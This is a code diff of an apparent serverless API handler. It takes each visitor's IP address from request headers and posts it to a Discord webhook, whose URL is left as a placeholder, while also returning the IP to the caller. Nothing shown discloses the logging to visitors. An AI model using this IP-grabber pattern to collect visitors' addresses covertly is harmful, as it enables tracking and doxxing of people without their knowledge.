@@ -1,37 +1,41 @@
 export default async function handler(req, res) {
-
-    const ip =
-        req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
-        req.socket?.remoteAddress ||
-        "Unknown";
-
-    // PASTE YOUR NEW DISCORD WEBHOOK BETWEEN THE QUOTES
-    const webhook = "PASTE_NEW_WEBHOOK_HERE";
-
     try {
+        const forwarded = req.headers["x-forwarded-for"];
 
-        await fetch(webhook, {
+        const ip =
+            (typeof forwarded === "string"
+                ? forwarded.split(",")[0].trim()
+                : null) ||
+            req.headers["x-real-ip"] ||
+            "Unknown";
+
+        const webhook = "PASTE_YOUR_NEW_WEBHOOK_HERE";
+
+        const discordResponse = await fetch(webhook, {
             method: "POST",
-
             headers: {
                 "Content-Type": "application/json"
             },
-
             body: JSON.stringify({
                 content: `🌐 Visitor IP: \`${ip}\``
             })
         });
 
-        res.status(200).json({
-            ip: ip
-        });
+        if (!discordResponse.ok) {
+            console.error(
+                "Discord error:",
+                discordResponse.status,
+                await discordResponse.text()
+            );
+        }
+
+        return res.status(200).json({ ip });
 
     } catch (error) {
+        console.error("API error:", error);
 
-        console.error(error);
-
-        res.status(500).json({
-            error: "Failed to send IP"
+        return res.status(500).json({
+            error: "Unable to detect IP"
         });
     }
 }
